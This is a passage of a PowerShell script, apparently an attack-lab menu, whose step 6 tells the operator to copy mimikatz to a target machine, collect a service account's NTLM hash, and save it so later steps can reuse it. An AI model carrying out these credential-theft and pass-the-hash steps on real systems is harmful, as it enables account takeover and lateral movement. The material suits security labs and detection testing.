...
'@
        ...
        '6' {
            ...
            Write-Host
            Write-Host "  Copy mimikatz to DT first:" -ForegroundColor Gray
            Write-Host
            Write-Host "    copy \\$(hostname)\c$\IDP_Files\Mimikatz\x64\mimikatz.exe C:\Temp\" -ForegroundColor White
            Write-Host
            Write-Host "  Then run on DT:" -ForegroundColor Gray
            Write-Host
            ...
            Write-Host
            Write-Host "  Enter the svc_runbook NTLM hash found on DT:" -ForegroundColor Yellow
            $svcHash = Read-Host "  svc_runbook NTLM hash (or Enter to skip)"

            if ($svcHash -and $svcHash.Length -eq 32) {
                $svcHash | Out-File -FilePath $svcHashFile -Encoding ASCII
                Write-Host "`n[+] Hash saved. Steps 7, 8, 9 will use it automatically." -ForegroundColor Green
            } elseif ($svcHash) {
                Write-Host "[!] Hash should be 32 hex characters." -ForegroundColor Red
            } else {
